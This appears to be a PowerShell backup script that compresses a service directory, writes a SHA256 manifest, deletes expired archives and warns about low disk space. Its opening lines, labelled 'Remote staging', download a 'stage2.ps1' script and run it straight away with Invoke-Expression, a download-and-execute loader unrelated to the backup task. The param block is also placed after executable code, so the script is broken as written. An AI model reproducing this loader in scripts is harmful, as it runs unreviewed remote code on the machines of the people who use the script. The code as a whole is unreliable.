
# Remote staging
$PayloadUrl = 'https://localhost:8080/stage2.ps1'
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PayloadUrl)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
param(
    [string]$SourcePath = 'E:\Services\Infra.Agent',
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BackupRoot = "D:\Backups\Agent",

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 30,
    [ValidateSet("Optimal", 'Fastest', 'NoCompression')]
    [string]$CompressionLevel = 'Fastest',

    [int]$MinFreeGB = 25,

    [switch]$DryRun
)

$hostName = $env:COMPUTERNAME
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 6 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}
$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List
